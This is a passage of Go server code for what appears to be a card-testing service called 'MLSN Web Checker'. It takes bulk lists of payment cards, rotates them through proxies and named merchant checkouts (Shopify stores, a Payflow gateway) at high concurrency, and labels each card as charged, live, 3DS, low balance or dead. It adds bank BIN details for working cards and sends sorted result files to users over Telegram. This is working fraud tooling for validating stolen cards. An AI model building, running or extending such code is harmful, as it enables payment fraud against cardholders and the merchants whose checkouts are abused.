	contentBytes, _ := io.ReadAll(file)
	lines := strings.Split(string(contentBytes), "\n")
	var sites []string
	seen := make(map[string]bool)
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !seen[line] {
			seen[line] = true
			sites = append(sites, line)
		}
	}
	saveFile(SITES_FILE, sites)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"loaded": len(sites)})
}

func apiUploadProxiesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, _ := io.ReadAll(file)
	lines := strings.Split(string(contentBytes), "\n")
	var proxies []string
	seen := make(map[string]bool)
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !seen[line] {
			seen[line] = true
			proxies = append(proxies, line)
		}
	}
	saveFile(PROXIES_FILE, proxies)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"loaded": len(proxies)})
}

func apiClearSitesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(SITES_FILE, []string{})
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"cleared": true})
}

func apiClearProxiesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(PROXIES_FILE, []string{})
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"cleared": true})
}

func apiAdminDBInfoHandler(w http.ResponseWriter, r *http.Request) {
	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	proxies := getProxies(userID, isAdmin)

	dbStatus := "Disconnected"
	maskedURL := "None"

	dbURL := os.Getenv("DATABASE_URL")
	if dbURL != "" {
		dbStatus = "Connected"
		parts := strings.Split(dbURL, "@")
		if len(parts) > 1 {
			hostPart := strings.Split(parts[1], "?")[0]
			maskedURL = "postgresql://***:***@" + hostPart
		} else {
			maskedURL = "postgresql://***"
		}

		if db != nil {
			if err := db.Ping(); err == nil {
				dbStatus = "Connected (Active)"
			} else {
				dbStatus = "Connected (Connection Error)"
			}
		} else {
			dbStatus = "Connected (Connection Error)"
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"db_status": dbStatus,
		"db_url":    maskedURL,
		"sites":     sites,
		"proxies":   proxies,
	})
}

func dbAddSite(url string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("INSERT INTO sites (url) VALUES ($1) ON CONFLICT (url) DO NOTHING", url)
}

func dbDeleteSite(url string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("DELETE FROM sites WHERE url = $1", url)
}

func dbAddProxy(proxy string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("INSERT INTO proxies (proxy) VALUES ($1) ON CONFLICT (proxy) DO NOTHING", proxy)
}

func dbDeleteProxy(proxy string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("DELETE FROM proxies WHERE proxy = $1", proxy)
}

func deleteProxyGlobally(proxy string) {
	proxyModifyMu.Lock()
	defer proxyModifyMu.Unlock()

	dbDeleteProxy(proxy)

	fileProxies := loadFile(PROXIES_FILE)
	var newProxies []string
	changed := false
	for _, p := range fileProxies {
		if p != proxy {
			newProxies = append(newProxies, p)
		} else {
			changed = true
		}
	}
	if changed {
		saveFile(PROXIES_FILE, newProxies)
	}

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()
}

func apiAdminAddSiteHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		URL string `json:"url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	urlStr := strings.TrimSpace(reqData.URL)
	if urlStr == "" {
		http.Error(w, "URL is empty", http.StatusBadRequest)
		return
	}

	fileSites := loadFile(SITES_FILE)
	found := false
	for _, s := range fileSites {
		if s == urlStr {
			found = true
			break
		}
	}
	if !found {
		fileSites = append(fileSites, urlStr)
		saveFile(SITES_FILE, fileSites)
	}

	dbAddSite(urlStr)

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminDeleteSiteHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		URL string `json:"url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	urlStr := strings.TrimSpace(reqData.URL)
	if urlStr == "" {
		http.Error(w, "URL is empty", http.StatusBadRequest)
		return
	}

	fileSites := loadFile(SITES_FILE)
	var newSites []string
	for _, s := range fileSites {
		if s != urlStr {
			newSites = append(newSites, s)
		}
	}
	saveFile(SITES_FILE, newSites)

	dbDeleteSite(urlStr)

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminAddProxyHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Proxy string `json:"proxy"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	proxy := strings.TrimSpace(reqData.Proxy)
	if proxy == "" {
		http.Error(w, "Proxy is empty", http.StatusBadRequest)
		return
	}

	fileProxies := loadFile(PROXIES_FILE)
	found := false
	for _, p := range fileProxies {
		if p == proxy {
			found = true
			break
		}
	}
	if !found {
		fileProxies = append(fileProxies, proxy)
		saveFile(PROXIES_FILE, fileProxies)
	}

	dbAddProxy(proxy)

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminDeleteProxyHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Proxy string `json:"proxy"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	proxy := strings.TrimSpace(reqData.Proxy)
	if proxy == "" {
		http.Error(w, "Proxy is empty", http.StatusBadRequest)
		return
	}

	deleteProxyGlobally(proxy)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func dbClearSites() {
	if db == nil {
		return
	}
	_, _ = db.Exec("TRUNCATE TABLE sites")
}

func dbClearProxies() {
	if db == nil {
		return
	}
	_, _ = db.Exec("TRUNCATE TABLE proxies")
}

func apiAdminUploadSitesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, err := io.ReadAll(file)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error()})
		return
	}

	content := string(contentBytes)
	lines := strings.Split(content, "\n")
	fileSites := loadFile(SITES_FILE)
	loadedCount := 0

	for _, line := range lines {
		urlStr := strings.TrimSpace(line)
		if urlStr != "" {
			found := false
			for _, s := range fileSites {
				if s == urlStr {
					found = true
					break
				}
			}
			if !found {
				fileSites = append(fileSites, urlStr)
			}
			dbAddSite(urlStr)
			loadedCount++
		}
	}

	saveFile(SITES_FILE, fileSites)

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "loaded": loadedCount})
}

func apiAdminClearSitesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(SITES_FILE, []string{})
	dbClearSites()

	dbCacheMu.Lock()
	dbSitesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiAdminUploadProxiesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, err := io.ReadAll(file)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error()})
		return
	}

	content := string(contentBytes)
	lines := strings.Split(content, "\n")
	fileProxies := loadFile(PROXIES_FILE)
	loadedCount := 0

	for _, line := range lines {
		proxy := strings.TrimSpace(line)
		if proxy != "" {
			found := false
			for _, p := range fileProxies {
				if p == proxy {
					found = true
					break
				}
			}
			if !found {
				fileProxies = append(fileProxies, proxy)
			}
			dbAddProxy(proxy)
			loadedCount++
		}
	}

	saveFile(PROXIES_FILE, fileProxies)

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "loaded": loadedCount})
}

func apiAdminClearProxiesHandler(w http.ResponseWriter, r *http.Request) {
	saveFile(PROXIES_FILE, []string{})
	dbClearProxies()

	dbCacheMu.Lock()
	dbProxiesCache = nil
	dbCacheMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

var (
	activeTasksMu sync.Mutex
	activeTasks   = make(map[int]context.CancelFunc)
)

func startResultCleanupTimer() {
	go func() {
		ticker := time.NewTicker(10 * time.Minute)
		for range ticker.C {
			files, err := os.ReadDir("data/results")
			if err == nil {
				now := time.Now()
				for _, f := range files {
					info, err := f.Info()
					if err != nil {
						continue
					}
					if now.Sub(info.ModTime()) > 24*time.Hour {
						_ = os.Remove(filepath.Join("data/results", f.Name()))
					}
				}
			}

			if db != nil {
				_, errDb := db.Exec(`
					UPDATE check_tasks 
					SET results = '[]'::jsonb, result_file_path = NULL 
					WHERE status != 'running' 
					  AND updated_at < CURRENT_TIMESTAMP - INTERVAL '24 hours'
					  AND (results != '[]'::jsonb OR result_file_path IS NOT NULL)
				`)
				if errDb != nil {
					log.Printf("Failed to clean up expired tasks in DB: %v", errDb)
				}
			}
		}
	}()
}

func sendTelegramDocument(chatID int64, filePath string, caption string) error {
	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	if botToken == "" {
		return errors.New("TELEGRAM_BOT_TOKEN is not set")
	}

	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	bodyBuf := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuf)

	if err := bodyWriter.WriteField("chat_id", strconv.FormatInt(chatID, 10)); err != nil {
		return err
	}
	if err := bodyWriter.WriteField("caption", caption); err != nil {
		return err
	}

	fileWriter, err := bodyWriter.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return err
	}
	if _, err := io.Copy(fileWriter, file); err != nil {
		return err
	}

	bodyWriter.Close()

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)
	req, err := http.NewRequest("POST", url, bodyBuf)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", bodyWriter.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram api error: status %d, body %s", resp.StatusCode, string(respBody))
	}

	return nil
}

func generateResultFile(taskID int, total int, results []CheckResult) (string, error) {
	err := os.MkdirAll("data/results", 0755)
	if err != nil {
		return "", err
	}
	filePath := fmt.Sprintf("data/results/results_%d.txt", taskID)
	f, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer f.Close()

	writer := bufio.NewWriter(f)
	fmt.Fprintf(writer, "=== MLSN WEB CHECKER RESULTS ===\n")
	fmt.Fprintf(writer, "Task ID: %d\n", taskID)
	fmt.Fprintf(writer, "Time: %s\n", time.Now().Format("2006-01-02 15:04:05 MST"))
	fmt.Fprintf(writer, "Total Checked: %d\n\n", total)

	charged := 0
	live := 0
	fraud := 0
	dead := 0
	otp := 0
	low := 0
	errCount := 0
	for _, r := range results {
		switch r.Status {
		case "CHARGED":
			charged++
		case "LIVE":
			live++
		case "FRAUD":
			fraud++
		case "DEAD":
			dead++
		case "OTP_REQUIRED":
			otp++
		case "LOW_BALANCE":
			low++
		default:
			errCount++
		}
	}
	fmt.Fprintf(writer, "Summary:\n")
	fmt.Fprintf(writer, "- CHARGED: %d\n", charged)
	fmt.Fprintf(writer, "- LIVE: %d\n", live)
	fmt.Fprintf(writer, "- FRAUD: %d\n", fraud)
	fmt.Fprintf(writer, "- DEAD: %d\n", dead)
	fmt.Fprintf(writer, "- OTP REQUIRED: %d\n", otp)
	fmt.Fprintf(writer, "- LOW BALANCE: %d\n", low)
	fmt.Fprintf(writer, "- ERROR/TIMEOUT: %d\n\n", errCount)

	writeCategory := func(title string, status string) {
		first := true
		for _, r := range results {
			if r.Status == status {
				if first {
					fmt.Fprintf(writer, "=== %s ===\n", title)
					first = false
				}
				fmt.Fprintf(writer, "%s | %s | %s | %s\n", r.Card, r.Status, r.Msg, r.Site)
			}
		}
		if !first {
			fmt.Fprintf(writer, "\n")
		}
	}

	writeCategory("CHARGED", "CHARGED")
	writeCategory("LIVE", "LIVE")
	writeCategory("FRAUD", "FRAUD")
	writeCategory("OTP REQUIRED", "OTP_REQUIRED")
	writeCategory("LOW BALANCE", "LOW_BALANCE")
	writeCategory("DEAD", "DEAD")

	firstErr := true
	for _, r := range results {
		if r.Status != "CHARGED" && r.Status != "LIVE" && r.Status != "FRAUD" && r.Status != "OTP_REQUIRED" && r.Status != "LOW_BALANCE" && r.Status != "DEAD" {
			if firstErr {
				fmt.Fprintf(writer, "=== ERRORS / TIMEOUTS ===\n")
				firstErr = false
			}
			fmt.Fprintf(writer, "%s | %s | %s | %s\n", r.Card, r.Status, r.Msg, r.Site)
		}
	}

	writer.Flush()
	return filePath, nil
}

func generateCategoryFile(taskID int, category string, results []CheckResult) (string, error) {
	err := os.MkdirAll("data/results", 0755)
	if err != nil {
		return "", err
	}
	filePath := fmt.Sprintf("data/results/%s_%d.txt", category, taskID)
	f, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer f.Close()

	writer := bufio.NewWriter(f)
	for _, r := range results {
		if r.Card != "" {
			if r.Msg != "" {
				fmt.Fprintf(writer, "%s | %s\n", r.Card, r.Msg)
			} else {
				fmt.Fprintf(writer, "%s\n", r.Card)
			}
		}
	}
	writer.Flush()
	return filePath, nil
}

func checkCardsBatchCtx(ctx context.Context, client *http.Client, sacAPI string, cards []Card, sites []string, proxies []string, concurrency int, gateway string, onCardChecked func(index int, res CheckResult)) []CheckResult {
	if concurrency <= 0 {
		concurrency = 1000
	}
	sem := make(chan struct{}, concurrency)
	results := make([]CheckResult, len(cards))

	var wg sync.WaitGroup
	for i, card := range cards {
		select {
		case <-ctx.Done():
			for j := i; j < len(cards); j++ {
				results[j] = CheckResult{
					Status: "CANCELLED",
					Msg:    "Task cancelled by user",
					Card:   cards[j].Formatted,
				}
			}
			return results
		default:
		}

		wg.Add(1)
		go func(index int, c Card) {
			defer wg.Done()
			select {
			case <-ctx.Done():
				results[index] = CheckResult{
					Status: "CANCELLED",
					Msg:    "Task cancelled by user",
					Card:   c.Formatted,
				}
				return
			case sem <- struct{}{}:
				defer func() { <-sem }()
			}

			res := checkCard(client, sacAPI, c, sites, proxies, gateway)
			res.Card = c.Formatted

			if res.Status == "CHARGED" || res.Status == "LIVE" || res.Status == "OTP_REQUIRED" || res.Status == "LOW_BALANCE" {
				binNum := getBinNumber(c.Formatted)
				if binNum != "" {
					if binInfo, err := fetchBinInfo(binNum); err == nil && binInfo != nil {
						res.BinBrand = binInfo.Brand
						res.BinType = binInfo.Type
						res.BinClass = binInfo.Class
						res.BinBank = binInfo.Bank
						res.BinCountry = binInfo.Country
					}
				}
			}

			results[index] = res

			if onCardChecked != nil {
				onCardChecked(index, res)
			}
		}(i, card)
	}
	wg.Wait()
	return results
}

func saveTaskProgress(taskID int, checked int, results []CheckResult) {
	if db == nil {
		return
	}
	resultsJSON, err := json.Marshal(results)
	if err != nil {
		return
	}
	_, _ = db.Exec(`
		UPDATE check_tasks 
		SET checked_cards = $1, results = $2, updated_at = CURRENT_TIMESTAMP 
		WHERE id = $3 AND status = 'running'
	`, checked, string(resultsJSON), taskID)
}

func getCleanSiteName(siteURL string) string {
	siteURL = strings.TrimSpace(siteURL)
	if siteURL == "" {
		return ""
	}

	knownSiteNames := map[string]string{
		"pipsticks.com":                   "Pip Sticks",
		"favorstoday.com":                 "Favors Today",
		"happyhentreats.com":              "Happy Hen Treats",
		"yorkspacesystems.com":            "York Space Systems",
		"shop.yorkspacesystems.com":       "York Space Systems",
		"reston-lloyd.myshopify.com":      "Reston Lloyd",
		"davids-toothpaste.myshopify.com": "Davids Toothpaste",
	}

	var host string
	u, err := url.Parse(siteURL)
	if err == nil && u.Host != "" {
		host = u.Host
	} else {
		host = siteURL
		if idx := strings.Index(host, "://"); idx != -1 {
			host = host[idx+3:]
		}
		if idx := strings.Index(host, "/"); idx != -1 {
			host = host[:idx]
		}
	}

	if idx := strings.Index(host, ":"); idx != -1 {
		host = host[:idx]
	}

	hostLower := strings.ToLower(host)
	if name, exists := knownSiteNames[hostLower]; exists {
		return name
	}

	core := hostLower

	if strings.HasSuffix(core, ".myshopify.com") {
		core = strings.TrimSuffix(core, ".myshopify.com")
	} else {
		parts := strings.Split(core, ".")
		if len(parts) >= 2 {
			last := parts[len(parts)-1]
			secLast := parts[len(parts)-2]
			isTLD := func(s string) bool {
				return s == "com" || s == "co" || s == "net" || s == "org" || s == "edu" || s == "gov" || s == "vn" || s == "us" || s == "uk" || s == "ca" || s == "info" || s == "biz" || s == "io" || s == "me"
			}
			if isTLD(last) && isTLD(secLast) && len(parts) >= 3 {
				core = strings.Join(parts[:len(parts)-2], ".")
			} else if isTLD(last) {
				core = strings.Join(parts[:len(parts)-1], ".")
			}
		}

		parts = strings.Split(core, ".")
		if len(parts) > 1 {
			first := parts[0]
			if first == "www" || first == "shop" || first == "checkout" || first == "api" || first == "store" || first == "app" || first == "portal" || first == "dev" || first == "sub" {
				core = strings.Join(parts[1:], ".")
			}
		}
	}

	core = strings.ReplaceAll(core, "-", " ")
	core = strings.ReplaceAll(core, "_", " ")

	var sb strings.Builder
	for i, r := range core {
		if i > 0 && r >= 'A' && r <= 'Z' {
			prev := core[i-1]
			if prev >= 'a' && prev <= 'z' {
				sb.WriteRune(' ')
			}
		}
		sb.WriteRune(r)
	}
	core = sb.String()

	words := strings.Fields(core)
	for i, w := range words {
		if len(w) > 0 {
			words[i] = strings.ToUpper(string(w[0])) + strings.ToLower(w[1:])
		}
	}

	result := strings.Join(words, " ")
	if result == "" {
		return siteURL
	}
	return result
}

func runTask(taskID int, userID int64, cards []Card, sites []string, proxies []string, concurrency int, isAdmin bool, gateway string) {
	ctx, cancel := context.WithCancel(context.Background())
	activeTasksMu.Lock()
	activeTasks[taskID] = cancel
	activeTasksMu.Unlock()

	defer func() {
		activeTasksMu.Lock()
		delete(activeTasks, taskID)
		activeTasksMu.Unlock()
		cancel()
	}()

	client := &http.Client{
		Timeout: 90 * time.Second,
	}
	sacAPI := os.Getenv("SAC_API")
	if sacAPI == "" {
		sacAPI = "https://thorough-fascination-production-725d.up.railway.app"
	}

	results := make([]CheckResult, len(cards))
	var resultsMu sync.Mutex
	checkedCount := 0

	updateTicker := time.NewTicker(1500 * time.Millisecond)
	dbUpdatedChan := make(chan bool, 1)

	go func() {
		for {
			select {
			case <-updateTicker.C:
				resultsMu.Lock()
				currentChecked := checkedCount
				resCopy := make([]CheckResult, len(results))
				copy(resCopy, results)
				resultsMu.Unlock()

				validResults := make([]CheckResult, 0, len(resCopy))
				for _, r := range resCopy {
					if r.Card != "" && r.Status != "" {
						validResults = append(validResults, r)
					}
				}

				saveTaskProgress(taskID, currentChecked, validResults)
			case <-dbUpdatedChan:
				return
			}
		}
	}()

	onCardChecked := func(index int, res CheckResult) {
		if !isAdmin {
			res.Site = getCleanSiteName(res.Site)
		}
		resultsMu.Lock()
		results[index] = res
		checkedCount++
		currentChecked := checkedCount
		resultsMu.Unlock()

		broadcastTaskUpdate(userID, map[string]interface{}{
			"type":          "card_checked",
			"task_id":       taskID,
			"total_cards":   len(cards),
			"checked_cards": currentChecked,
			"status":        "running",
			"result":        res,
		})
	}

	finalResults := checkCardsBatchCtx(ctx, client, sacAPI, cards, sites, proxies, concurrency, gateway, onCardChecked)

	updateTicker.Stop()
	dbUpdatedChan <- true

	validFinalResults := make([]CheckResult, 0, len(finalResults))
	for _, r := range finalResults {
		if r.Card != "" && r.Status != "" {
			validFinalResults = append(validFinalResults, r)
		}
	}

	status := "completed"
	select {
	case <-ctx.Done():
		status = "cancelled"
	default:
	}

	resultsJSON, _ := json.Marshal(validFinalResults)
	filePath, errGenResult := generateResultFile(taskID, len(validFinalResults), validFinalResults)
	var dbFilePath sql.NullString
	if errGenResult == nil {
		dbFilePath.String = filePath
		dbFilePath.Valid = true
	}
	_, _ = db.Exec(`
		UPDATE check_tasks 
		SET status = $1, checked_cards = $2, results = $3, result_file_path = $4, updated_at = CURRENT_TIMESTAMP 
		WHERE id = $5
	`, status, len(validFinalResults), string(resultsJSON), dbFilePath, taskID)

	broadcastTaskUpdate(userID, map[string]interface{}{
		"type":          "task_status",
		"task_id":       taskID,
		"status":        status,
		"total_cards":   len(validFinalResults),
		"checked_cards": len(validFinalResults),
	})

	// Generate and send separate category files
	categories := []struct {
		name   string
		filter func(status string) bool
	}{
		{"CHARGED", func(s string) bool { return s == "CHARGED" }},
		{"LIVE", func(s string) bool { return s == "LIVE" }},
		{"3DS", func(s string) bool { return s == "OTP_REQUIRED" }},
		{"LOW", func(s string) bool { return s == "LOW_BALANCE" }},
		{"FRAUD", func(s string) bool { return s == "FRAUD" }},
		{"DIE", func(s string) bool { return s == "DEAD" }},
		{"ERROR", func(s string) bool {
			return s != "CHARGED" && s != "LIVE" && s != "OTP_REQUIRED" && s != "LOW_BALANCE" && s != "FRAUD" && s != "DEAD"
		}},
	}

	var generatedFiles []string
	telegramSentOk := false
	hasFiles := false

	for _, cat := range categories {
		var catResults []CheckResult
		for _, r := range validFinalResults {
			if cat.filter(r.Status) {
				catResults = append(catResults, r)
			}
		}

		if len(catResults) > 0 {
			hasFiles = true
			filePath, errGen := generateCategoryFile(taskID, cat.name, catResults)
			if errGen == nil {
				generatedFiles = append(generatedFiles, filePath)
				caption := fmt.Sprintf("MLSN Checker Task #%d - %s\nTotal: %d\nStatus: %s", taskID, cat.name, len(catResults), status)
				errTelegram := sendTelegramDocument(userID, filePath, caption)
				if errTelegram != nil {
					log.Printf("Failed to send telegram file for task %d [%s]: %v", taskID, cat.name, errTelegram)
				} else {
					telegramSentOk = true
				}
			} else {
				log.Printf("Failed to generate file for task %d [%s]: %v", taskID, cat.name, errGen)
			}
		}
	}

	// Clean up local files - Skip immediately to retain for 24h
	// for _, fPath := range generatedFiles {
	// 	_ = os.Remove(fPath)
	// }

	// Update telegram_sent status in database without clearing results
	_, _ = db.Exec(`
		UPDATE check_tasks 
		SET telegram_sent = $1, updated_at = CURRENT_TIMESTAMP
		WHERE id = $2
	`, telegramSentOk || !hasFiles, taskID)
}

func apiCheckStartHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var reqData struct {
		Cards       string      `json:"cards"`
		Proxies     []string    `json:"proxies"`
		Concurrency interface{} `json:"concurrency"`
		Semaphore   interface{} `json:"semaphore"`
		Gateway     string      `json:"gateway"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	cards := parseCards(reqData.Cards)
	if len(cards) == 0 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No valid cards found"})
		return
	}

	concurrency := 1000
	getConcurrency := func(val interface{}) int {
		if val == nil {
			return 0
		}
		switch v := val.(type) {
		case float64:
			return int(v)
		case string:
			if i, err := strconv.Atoi(v); err == nil {
				return i
			}
		}
		return 0
	}
	if c := getConcurrency(reqData.Concurrency); c > 0 {
		concurrency = c
	} else if s := getConcurrency(reqData.Semaphore); s > 0 {
		concurrency = s
	}

	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	proxies := reqData.Proxies
	if len(proxies) == 0 {
		proxies = getProxies(userID, isAdmin)
	}

	if reqData.Gateway == "payflow" {
		payflowLockMu.RLock()
		locked := time.Now().Before(payflowLockedUntil)
		remaining := time.Until(payflowLockedUntil)
		payflowLockMu.RUnlock()
		if locked {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusForbidden)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"error": fmt.Sprintf("Payflow V2 is temporarily locked for another %d minutes due to account issues (Error 10069).", int(remaining.Minutes())+1),
			})
			return
		}

		if !isAdmin {
			payflowCooldownMu.Lock()
			lastCheck, exists := payflowUserCooldown[userID]
			if exists && time.Since(lastCheck) < 10*time.Second {
				rem := 10*time.Second - time.Since(lastCheck)
				payflowCooldownMu.Unlock()
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusTooManyRequests)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"error": fmt.Sprintf("Rate limit: Please wait %.1f seconds before checking again.", rem.Seconds()),
				})
				return
			}
			payflowUserCooldown[userID] = time.Now()
			payflowCooldownMu.Unlock()
		}

		if len(cards) > 1 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn, không hỗ trợ check hàng loạt!"})
			return
		}
		if len(proxies) == 0 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 bắt buộc phải có proxy mới được check!"})
			return
		}
	}

	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	if !isAdmin && len(cards) > 20000 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Giới hạn tối đa 20.000 thẻ cho mỗi task! / Maximum limit of 20,000 cards per task!"})
		return
	}

	var hasRunning bool
	errRunning := db.QueryRow(`
		SELECT EXISTS(
			SELECT 1 FROM check_tasks 
			WHERE user_id = $1 AND status = 'running'
		)
	`, userID).Scan(&hasRunning)
	if errRunning == nil && hasRunning {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusConflict)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": "Bạn đang có một task khác đang chạy! Vui lòng đợi task đó hoàn thành hoặc hủy nó trước khi tạo task mới. / You have another task running! Please wait for it to complete or cancel it first.",
		})
		return
	}

	if !isAdmin {
		var lastCreatedAt time.Time
		errRate := db.QueryRow(`
			SELECT created_at 
			FROM check_tasks 
			WHERE user_id = $1 
			ORDER BY id DESC 
			LIMIT 1
		`, userID).Scan(&lastCreatedAt)

		if errRate == nil {
			if time.Since(lastCreatedAt) < 5*time.Minute {
				remaining := 5*time.Minute - time.Since(lastCreatedAt)
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusTooManyRequests)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"error": fmt.Sprintf("Rate limit exceeded. Please wait %d seconds. / Bạn đang tạo task quá nhanh, vui lòng đợi %d giây.", int(remaining.Seconds()), int(remaining.Seconds())),
				})
				return
			}
		}
	}

	var taskID int
	err := db.QueryRow(`
		INSERT INTO check_tasks (user_id, status, total_cards, checked_cards, results)
		VALUES ($1, 'running', $2, 0, '[]'::jsonb)
		RETURNING id
	`, userID, len(cards)).Scan(&taskID)
	if err != nil {
		log.Println("Failed to create task in DB:", err)
		http.Error(w, "Failed to create task", http.StatusInternalServerError)
		return
	}
	if userID == 6071715158 {
		isAdmin = true
	}
	go runTask(taskID, userID, cards, sites, proxies, concurrency, isAdmin, reqData.Gateway)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"task_id": taskID,
	})
}

func apiProxiesTestHandler(w http.ResponseWriter, r *http.Request) {
	userID, _, isAdmin := getSessionUser(r)
	proxies := getProxies(userID, isAdmin)

	if len(proxies) == 0 {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"results": []interface{}{},
			"message": "No proxies found. / Không có proxy nào trong danh sách.",
		})
		return
	}

	type TestResult struct {
		Proxy     string `json:"proxy"`
		Status    string `json:"status"`
		LatencyMs int64  `json:"latency_ms"`
		Error     string `json:"error,omitempty"`
	}

	results := make([]TestResult, len(proxies))
